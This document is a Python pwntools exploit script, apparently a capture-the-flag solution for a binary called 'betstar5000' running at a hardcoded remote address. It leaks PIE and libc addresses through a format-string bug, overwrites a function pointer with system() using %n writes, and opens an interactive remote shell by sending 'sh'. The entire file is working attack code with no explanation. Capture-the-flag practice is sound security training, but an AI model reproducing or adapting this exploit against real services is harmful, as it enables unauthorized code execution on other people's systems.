from __future__ import print_function
from pwn import *

#target = process("./betstar5000")
target = remote("13.53.69.114", 50000)
#gdb.attach(target)

elf = ELF("betstar5000")
libc = ELF("libc-2.27.so")


def getMenu():
    print(target.recvuntil("5. End the game"))

def getLeaks():
    getMenu()
    target.sendline("1")# menu
    target.sendline("1")
    target.sendline("1")
    print(target.recvuntil("And the winner is *drumroll*: "))
    leak = target.recvline().strip("\n")
    return leak

def addPlayer(name):
    getMenu()
    target.sendline("3")
    raw_input()
    target.sendline(name)

def editPlayer(index, name):
    target.sendline("4")
    raw_input()

    target.sendline(str(index))
    raw_input()

    target.sendline(name)


# Get infoleaks, calculate needed addresses

target.sendline("1")
target.sendline("%x.%x")

leak = getLeaks()

pieBase = int(leak.split(".")[0], 16) - 0x105c
libcBase = int(leak.split(".")[1], 16) - 0x1d85c0
mallocHook = libcBase + libc.symbols["__malloc_hook"]
system = libcBase + libc.symbols["system"]
strtok = pieBase + 0x2584

print("pie base is: " + hex(pieBase))
print("libc base is: " + hex(libcBase))
print("malloc hook is: " + hex(mallocHook))
print("strtok: " + hex(strtok))
print("printf: " + hex(pieBase + 0x9df))

# Calculate the amount of bytes we need to print for the fmt string write

x = (system & 0xffff) - 8
y = ((system & 0xffff0000) >> 16) - (system & 0xffff)

# Make the fmt string

noop = p32(strtok) + p32(strtok + 2) + "%" + str(x) + "x%19$n" + "%" + str(y) + "x%20$n"

# Add two new players
filler = "0"*12

for i in range(0, 2):
    addPlayer(filler)

editPlayer(1, noop[0:17])
editPlayer(2, noop[16:])

# Get our fmt string to the vulnerable printf call

target.sendline("1")
target.sendline("2")
target.sendline("100")

target.sendline("1")

# Send 'sh' to be our argument to system, to get our shell

target.sendline("sh")

# Enjoy your shell

target.interactive()